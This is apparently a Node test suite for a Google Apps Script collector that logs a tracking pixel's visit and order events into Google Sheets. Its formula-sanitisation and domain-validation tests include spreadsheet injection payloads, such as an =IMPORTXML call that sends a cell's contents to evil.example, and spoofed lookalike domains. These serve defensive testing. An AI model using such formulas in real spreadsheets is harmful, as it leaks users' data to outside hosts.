'use strict';
// collector/apps-script.gs run in a Node vm against small mocks of the Apps
// Script services it uses, fed with payloads built by the pixel's own code.
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const fs = require('fs');
const path = require('path');
const t = require('../src/lib/touch.js');
const { classify } = require('../src/lib/classify.js');
const { extractOrder } = require('../src/lib/extract-order.js');

const SOURCE = fs.readFileSync(path.join(__dirname, '..', 'collector', 'apps-script.gs'), 'utf8');
const NOW = Date.parse('2026-10-19T14:00:00.000Z');

// A leading apostrophe forces text in Google Sheets and is not part of the value.
const norm = (v) => (typeof v === 'string' && v.startsWith("'") ? v.slice(1) : v);

// A tab: its values, plus the grid size, which counts toward the Sheet's limit
// whether the cells are filled or not.
function makeSheet(writes, name, ss) {
  const rows = [];
  const dims = { rows: 1000, cols: 26 };
  const lastRow = () => {
    for (let i = rows.length - 1; i >= 0; i--) if (rows[i] && rows[i].some((v) => v !== '' && v != null)) return i + 1;
    return 0;
  };
  const sheet = {
    rows,
    dims,
    getName: () => name,
    setName: (n) => { delete ss.sheets[name]; name = n; ss.sheets[n] = sheet; return sheet; },
    appendRow: (r) => {
      writes.push(r);
      const at = lastRow();
      rows[at] = r.map(norm);
      dims.rows = Math.max(dims.rows, at + 1);
    },
    getLastRow: lastRow,
    getLastColumn: () => Math.max(0, ...rows.map((r) => (r || []).reduce((n, v, j) => (v !== '' && v != null ? j + 1 : n), 0))),
    getMaxRows: () => dims.rows,
    getMaxColumns: () => dims.cols,
    deleteColumns: (c, n) => { rows.forEach((r) => r && r.splice(c - 1, n)); dims.cols -= n; },
    insertRowsAfter: (r, n) => { rows.splice(r, 0, ...Array.from({ length: n }, () => [])); dims.rows += n; },
    deleteRows: (r, n) => {
      if (dims.rows - n <= 1) throw new Error('No es posible borrar todas las filas no inmovilizadas.');
      rows.splice(r - 1, n);
      dims.rows -= n;
    },
    copyTo: (target) => {
      const copy = target.insertSheet('Copia de ' + name);
      rows.forEach((r, i) => { copy.rows[i] = r ? r.slice() : r; });
      return copy;
    },
    clearContents: () => { rows.length = 0; },
    setFrozenRows: () => {},
    getDataRange() { return this.getRange(1, 1, lastRow(), Math.max(1, ...rows.map((r) => (r ? r.length : 0)))); },
    getRange: (r, c, nr = 1, nc = 1) => ({
      getValues: () => Array.from({ length: nr }, (_, i) => Array.from({ length: nc }, (_, j) => {
        const v = (rows[r - 1 + i] || [])[c - 1 + j];
        return v === undefined ? '' : v;
      })),
      setValues: (v) => v.forEach((vr, i) => {
        writes.push(vr);
        const row = rows[r - 1 + i] || [];
        vr.forEach((x, j) => { row[c - 1 + j] = norm(x); });
        rows[r - 1 + i] = row;
        dims.rows = Math.max(dims.rows, r + i);
      }),
      clearContent: () => {
        for (let i = 0; i < nr; i++) {
          const row = rows[r - 1 + i] || [];
          for (let j = 0; j < nc; j++) row[c - 1 + j] = '';
          rows[r - 1 + i] = row;
        }
      },
    }),
  };
  return sheet;
}

function makeSpreadsheet(writes, name) {
  const order = [];
  const ss = {
    sheets: {},
    getName: () => name,
    getUrl: () => 'https://docs.google.com/spreadsheets/d/' + encodeURIComponent(name),
    getSheetByName: (n) => ss.sheets[n] || null,
    getSheets: () => order.slice(),
    insertSheet: (n) => {
      const sheet = makeSheet(writes, n, ss);
      ss.sheets[n] = sheet;
      order.push(sheet);
      return sheet;
    },
    deleteSheet: (sheet) => { delete ss.sheets[sheet.getName()]; order.splice(order.indexOf(sheet), 1); },
    setSpreadsheetTimeZone: () => {},
  };
  return ss;
}

function load() {
  const writes = [];
  const triggers = [];
  const cache = new Map();
  const props = new Map();
  const created = [];
  let clock = NOW;
  const ss = makeSpreadsheet(writes, 'Hot Sale');
  const sheets = ss.sheets;
  const lock = { waitLock() {}, tryLock: () => true, releaseLock() {} };
  const ctx = vm.createContext({
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ss,
      create: (n) => {
        const made = makeSpreadsheet(writes, n);
        made.insertSheet('Hoja 1');
        created.push(made);
        return made;
      },
    },
    LockService: { getScriptLock: () => lock, getUserLock: () => lock },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (cache.has(k) && cache.get(k).expires > clock ? cache.get(k).value : null),
        put: (k, value, seconds = 600) => cache.set(k, { value, expires: clock + seconds * 1000 }),
      }),
    },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (props.has(k) ? props.get(k) : null), setProperty: (k, v) => props.set(k, v) }) },
    ScriptApp: {
      getProjectTriggers: () => triggers.slice(),
      deleteTrigger: (tr) => triggers.splice(triggers.indexOf(tr), 1),
      newTrigger: (fn) => ({ timeBased: () => ({ everyMinutes: (m) => ({ create: () => triggers.push({ fn, m, getHandlerFunction: () => fn }) }) }) }),
    },
    ContentService: { createTextOutput: (s) => ({ text: s }) },
    Utilities: { formatDate: (d) => d.toISOString() },
    console: { log() {}, error: console.error },
    Date: class extends Date {
      constructor(...a) { if (a.length) super(...a); else super(clock); }
      static now() { return clock; }
    },
  });
  vm.runInContext(SOURCE, ctx);
  ctx.setup();
  sheets.aliados.appendRow(['Tienda A', 'https://www.tiendaa.com/']);
  sheets.aliados.appendRow(['Tienda B', 'tiendab.co']);
  const post = (body) => ctx.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } });
  const tab = (name) => {
    const [header, ...data] = sheets[name].rows.filter((r) => r && r.length);
    return data.map((r) => Object.fromEntries(header.map((h, i) => [h, r[i]])));
  };
  return { ctx, sheets, writes, triggers, created, post, tab, advance: (ms) => { clock += ms; } };
}

const cfg = { hsSources: ['hotsale'], referrerDomains: ['hotsale.com.co'], pixelVersion: '2.0.0' };
function visit(utmCampaign = 'hs26oct', landedMs = NOW - 3600000) {
  const hit = classify(`?utm_source=hotsale&utm_campaign=${utmCampaign}`, 'https://hotsale.com.co/', cfg);
  return t.buildTouch(hit, landedMs, 'www.tiendaa.com');
}
const touchOf = (touch, domain = 'www.tiendaa.com') => t.touchPayload(touch, domain, NOW, cfg);
const orderOf = (touch, dataLayer, domain = 'www.tiendaa.com') => t.purchasePayload(touch, extractOrder(dataLayer), domain, NOW, false, cfg);
const ga4 = (id, value, currency = 'COP') => [{ event: 'purchase', ecommerce: { transaction_id: id, value, currency } }];

test('setup creates every tab and one 10-minute trigger (idempotent)', () => {
  const { ctx, sheets, triggers } = load();
  ctx.setup();
  assert.deepEqual(Object.keys(sheets).sort(), ['aliados', 'eventos', 'pedidos', 'rechazados', 'toques']);
  assert.deepEqual(triggers.map((x) => [x.fn, x.m]), [['procesar', 10]]);
});

test('a visit and its order: logged in eventos, then one row each in toques and pedidos', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  assert.equal(post(touchOf(v)).text, 'ok');
  assert.equal(ctx.doGet().text, 'ok');
  post(orderOf(v, ga4('00123', 250000)));
  assert.equal(tab('eventos').length, 2);
  assert.equal(tab('eventos')[0].aliado, 'Tienda A');
  ctx.procesar();
  assert.equal(tab('toques').length, 1);
  const [order] = tab('pedidos');
  assert.equal(order.order_id, '00123', 'kept as text, leading zeros intact');
  assert.equal(order.order_value, 250000);
  assert.equal(order.order_status, 'complete');
  assert.equal(order.alerta, '');
  assert.equal(tab('rechazados').length, 0);
});

test('rejected: garbage, v1 payloads, unknown or lookalike domains, bad fields', () => {
  const { post, tab } = load();
  const good = touchOf(visit());
  const cases = [
    ['{not json', 'JSON inválido'],
    [{ store_domain: 'www.tiendaa.com', utm_source: 'hotsale', order_id: 'unknown', order_value: 0 }, 'v distinto de 2'],
    [{ ...good, pixel_version: '1.0.0' }, 'versión del píxel no soportada'],
    [{ ...good, event: 'click' }, 'event inválido'],
    [{ ...good, signal: 'keyword' }, 'signal inválido'],
    [{ ...good, is_test: 'no' }, 'is_test inválido'],
    [{ ...good, landed_at: 'ayer' }, 'landed_at inválido'],
    [{ ...good, landed_at: new Date(NOW - 40 * 86400000).toISOString() }, 'landed_at fuera de rango'],
    [{ ...good, landed_at: new Date(NOW + 2 * 86400000).toISOString() }, 'landed_at fuera de rango'],
    [{ ...good, sent_at: 'ahora' }, 'sent_at inválido'],
    [{ ...good, utm_campaign: 5 }, 'utm_campaign inválido'],
    [{ ...good, store_domain: 'evil.com' }, 'dominio no registrado: evil.com'],
    [{ ...good, store_domain: 'tiendaa.com.evil.com' }, 'dominio no registrado: tiendaa.com.evil.com'],
    [{ ...good, store_domain: 'evil-tiendaa.com' }, 'dominio no registrado: evil-tiendaa.com'],
    [{ ...orderOf(visit(), ga4('X', 1)), order_value: '250000' }, 'order_value inválido'],
    [{ ...orderOf(visit(), ga4('X', 1)), order_status: 'paid' }, 'order_status inválido'],
    [{ ...orderOf(visit(), ga4('X', 1)), currency: 'pesos' }, 'currency inválida'],
    ['x'.repeat(9000), 'cuerpo de más de 8 KB'],
  ];
  for (const [body] of cases) post(body);
  assert.equal(tab('eventos').length, 0);
  assert.deepEqual(tab('rechazados').map((r) => r.motivo), cases.map((c) => c[1]));
});

test('the store domain may be the registered one, www or any subdomain', () => {
  const { post, tab } = load();
  const v = visit();
  for (const d of ['tiendaa.com', 'www.tiendaa.com', 'checkout.tiendaa.com', 'TIENDAB.CO']) post(touchOf(v, d));
  assert.deepEqual(tab('eventos').map((r) => r.aliado), ['Tienda A', 'Tienda A', 'Tienda A', 'Tienda B']);
});

test('rate limit per store, and a cap on logged rejections', () => {
  const { post, tab, advance } = load();
  for (let i = 0; i < 125; i++) post(touchOf(visit('c' + i)));
  assert.equal(tab('eventos').length, 120);
  assert.equal(tab('rechazados').length, 5);
  assert.match(tab('rechazados')[0].motivo, /más de 120 envíos por minuto de tiendaa\.com/);
  advance(60000);
  post(touchOf(visit('next-minute')));
  assert.equal(tab('eventos').length, 121, 'the limit resets every minute');
  for (let i = 0; i < 100; i++) post('garbage');
  assert.equal(tab('rechazados').length, 5 + 30, 'at most 30 rejections logged in the new minute');
});

test('pedidos: one row per order; complete replaces incomplete, within a run and across runs', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  post(touchOf(v));
  post(orderOf(v, ga4('T1', '250.000')));
  post(orderOf(v, ga4('T1', '250.000')));
  ctx.procesar();
  assert.equal(tab('pedidos').length, 1);
  assert.equal(tab('pedidos')[0].order_status, 'incomplete');
  post(orderOf(v, ga4('T1', 250000)));
  post(orderOf(v, ga4('T1', '250.000')));
  ctx.procesar();
  assert.equal(tab('pedidos').length, 1);
  assert.equal(tab('pedidos')[0].order_status, 'complete');
  assert.equal(tab('pedidos')[0].order_value, 250000);
  assert.equal(tab('eventos').length, 5, 'the raw log keeps everything');
});

test('alerts: no recorded arrival, arrival used by another order, high value', () => {
  const { ctx, post, tab } = load();
  const a = visit('a');
  const b = visit('b');
  post(orderOf(a, ga4('NO-TOUCH', 1000)));
  post(touchOf(b));
  post(orderOf(b, ga4('FIRST', 1000)));
  post(orderOf(b, ga4('SECOND', 1000)));
  post(orderOf(b, ga4('BIG', 99000000)));
  post(orderOf(b, ga4('BIG-USD', 6000, 'USD')));
  ctx.procesar();
  assert.deepEqual(tab('pedidos').map((r) => [r.order_id, r.alerta]), [
    ['NO-TOUCH', 'sin llegada registrada'],
    ['FIRST', ''],
    ['SECOND', 'llegada ya usada por otro pedido'],
    ['BIG', 'llegada ya usada por otro pedido, valor alto'],
    ['BIG-USD', 'llegada ya usada por otro pedido, valor alto'],
  ]);
});

test('duplicate arrivals collapse; orders without id are all kept', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  post(touchOf(v));
  post(touchOf(v));
  post(orderOf(v, []));
  post(orderOf(v, []));
  ctx.procesar();
  ctx.procesar();
  assert.equal(tab('toques').length, 1);
  assert.equal(tab('pedidos').length, 2);
});

test('text from URLs can never become a formula, including when procesar copies it', () => {
  const { ctx, post, writes } = load();
  const v = { ...visit(), utm_campaign: '=IMPORTXML("https://evil.example/?"&A1,"//a")', utm_term: '+1', utm_content: '@x' };
  post(touchOf(v));
  post(orderOf(v, ga4('=HYPERLINK("https://evil.example")', 1000)));
  writes.length = 0;
  ctx.procesar();
  assert.ok(writes.length > 0);
  for (const row of writes) {
    for (const cell of row) {
      if (typeof cell === 'string' && cell !== '') assert.ok(cell.startsWith("'"), `not forced to text: ${cell}`);
    }
  }
});

test('reprocesar rebuilds the same toques and pedidos from the raw log', () => {
  const { ctx, post, tab } = load();
  const v = visit();
  post(touchOf(v));
  post(orderOf(v, ga4('T1', '250.000')));
  post(orderOf(v, ga4('T1', 250000)));
  post(orderOf(v, ga4('T2', 1000)));
  ctx.procesar();
  const before = JSON.stringify([tab('toques'), tab('pedidos')]);
  ctx.reprocesar();
  assert.equal(JSON.stringify([tab('toques'), tab('pedidos')]), before);
});

test('keyword_only events are accepted like any other signal', () => {
  const { ctx, post, tab } = load();
  const hit = classify('?utm_campaign=hotsale_newsletter', '', { ...cfg, hsKeywords: ['hotsale'] });
  assert.equal(hit.signal, 'keyword_only');
  const v = t.buildTouch(hit, NOW - 60000, 'www.tiendaa.com');
  post(touchOf(v));
  post(orderOf(v, ga4('K1', 1000)));
  ctx.procesar();
  assert.equal(tab('rechazados').length, 0);
  assert.equal(tab('pedidos')[0].signal, 'keyword_only');
});

test('eventos: no v or pixel_version, dates as date cells, is_test also for the test build', () => {
  const { post, tab, sheets } = load();
  const v = visit();
  post(touchOf(v));
  post(t.touchPayload(v, 'www.tiendaa.com', NOW, { ...cfg, pixelVersion: '2.0.0-prueba' }));
  post({ ...touchOf(v), is_test: true });
  assert.equal(sheets.eventos.rows[0].slice(0, 4).join(), 'recibido,aliado,event,store_domain');
  const rows = tab('eventos');
  assert.ok(!('v' in rows[0]) && !('pixel_version' in rows[0]));
  assert.ok(rows[0].landed_at instanceof Date && rows[0].sent_at instanceof Date);
  assert.equal(rows[0].landed_at.toISOString(), v.landed_at);
  assert.equal(rows[0].sent_at.toISOString(), new Date(NOW).toISOString());
  assert.deepEqual(rows.map((r) => r.is_test), [false, true, true]);
});

test('rechazados: one column per field, the raw text only when the body is not JSON', () => {
  const { post, tab, writes } = load();
  post({ ...touchOf(visit()), store_domain: 'evil.com', utm_source: '=IMAGE("https://evil.example")', utm_campaign: 'x'.repeat(300) });
  assert.ok(writes.at(-1).every((c) => typeof c !== 'string' || c === '' || c.startsWith("'")), 'forced to text');
  post('{not json');
  const [a, b] = tab('rechazados');
  assert.equal(a.motivo, 'dominio no registrado: evil.com');
  assert.deepEqual([a.store_domain, a.event, a.pixel_version, a.utm_source], ['evil.com', 'touch', '2.0.0', '=IMAGE("https://evil.example")']);
  assert.equal(a.utm_campaign.length, 100);
  assert.equal(a.extracto, '');
  assert.deepEqual([b.motivo, b.store_domain, b.extracto], ['JSON inválido', '', '{not json']);
});

test('migrar converts a Sheet set up before 2026-09-30 in place, and can run again', () => {
  const { ctx, sheets, post, tab } = load();
  const OLD = ['recibido', 'aliado', 'v', 'pixel_version', 'event', 'store_domain', 'order_id', 'order_value',
    'order_value_raw', 'currency', 'order_status', 'value_source', 'signal', 'landed_at', 'sent_at', 'is_test',
    'utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'utm_id'];
  const old = (p) => OLD.map((c) => (c === 'recibido' ? new Date(NOW) : c === 'aliado' ? 'Tienda A' : p[c] ?? ''));
  const a = visit('a');
  const b = visit('b');
  sheets.eventos.rows.splice(0, Infinity, OLD, old(touchOf(a)), old(orderOf(a, ga4('A1', 1000))),
    old(t.touchPayload(b, 'www.tiendaa.com', NOW, { ...cfg, pixelVersion: '2.0.0-prueba' })));
  sheets.rechazados.rows.splice(0, Infinity, ['recibido', 'motivo', 'cuerpo'],
    [new Date(NOW), 'dominio no registrado: evil.com', JSON.stringify({ ...touchOf(a), store_domain: 'evil.com' })],
    [new Date(NOW), 'JSON inválido', '{not json']);
  sheets.toques.rows.splice(0, Infinity, ['clave', ...OLD], ['stale']);
  post(orderOf(b, ga4('B1', 2000))); // the new version is deployed before migrar runs
  ctx.migrar();

  const ev = tab('eventos');
  assert.deepEqual(ev.map((r) => [r.event, r.order_id, r.is_test]),
    [['touch', '', false], ['purchase', 'A1', false], ['touch', '', true], ['purchase', 'B1', false]]);
  assert.ok(ev.every((r) => r.landed_at instanceof Date && r.sent_at instanceof Date));
  assert.equal(ev[0].landed_at.toISOString(), a.landed_at);
  assert.ok(sheets.eventos.rows.every((r) => r.slice(20).every((x) => x === '')), 'old columns U:V cleared');
  assert.deepEqual(tab('rechazados').map((r) => [r.motivo, r.store_domain, r.extracto]),
    [['dominio no registrado: evil.com', 'evil.com', ''], ['JSON inválido', '', '{not json']]);
  assert.equal(tab('toques').length, 2);
  assert.deepEqual(tab('pedidos').map((r) => [r.order_id, r.alerta]), [['A1', ''], ['B1', '']], 'orders still find their arrival');

  const before = JSON.stringify(['eventos', 'rechazados', 'toques', 'pedidos'].map(tab));
  ctx.migrar();
  assert.equal(JSON.stringify(['eventos', 'rechazados', 'toques', 'pedidos'].map(tab)), before);
});

test('setup deletes unused columns, but not ones with something written in them', () => {
  const { ctx, sheets } = load();
  assert.deepEqual(['eventos', 'rechazados', 'toques', 'pedidos', 'aliados'].map((n) => sheets[n].getMaxColumns()), [20, 12, 21, 23, 2]);
  sheets.rechazados.dims.cols = 26;
  sheets.toques.dims.cols = 26;
  sheets.toques.rows[1] = Array.from({ length: 26 }, (_, j) => (j === 25 ? 'nota' : ''));
  ctx.setup();
  assert.equal(sheets.rechazados.getMaxColumns(), 12);
  assert.equal(sheets.toques.getMaxColumns(), 26, 'column Z has a note: left alone');
});

test('a store added to aliados is accepted within a minute', () => {
  const { post, tab, sheets, advance } = load();
  const v = visit();
  post(touchOf(v, 'tiendac.com'));
  sheets.aliados.appendRow(['Tienda C', 'tiendac.com']);
  post(touchOf(v, 'tiendac.com'));
  assert.equal(tab('eventos').length, 0, 'the list is cached');
  advance(60000);
  post(touchOf(v, 'tiendac.com'));
  assert.deepEqual(tab('eventos').map((r) => r.aliado), ['Tienda C']);
});

test('archivar moves the rows to a new spreadsheet; later events are processed as usual', () => {
  const { ctx, sheets, post, tab, created } = load();
  sheets.eventos.dims.rows = 3; // appends will fill the grid exactly: the case Sheets refuses to empty
  const a = visit('a');
  post(touchOf(a));
  post(orderOf(a, ga4('A1', 1000)));
  post('{not json');
  const url = ctx.archivar();

  const [archive] = created;
  assert.equal(url, archive.getUrl());
  const names = ['eventos', 'rechazados', 'toques', 'pedidos'];
  assert.deepEqual(archive.getSheets().map((s) => s.getName()), names);
  const filled = (sheet) => sheet.rows.filter((r) => r && r.some((v) => v !== '')).length - 1;
  assert.deepEqual(names.map((n) => filled(archive.getSheetByName(n))), [2, 1, 1, 1]);
  for (const n of names) assert.equal(tab(n).length, 0, n + ' emptied');

  const b = visit('b');
  post(touchOf(b));
  post(orderOf(b, ga4('B1', 1000)));
  ctx.procesar();
  assert.deepEqual(tab('pedidos').map((r) => [r.order_id, r.alerta]), [['B1', '']]);
});
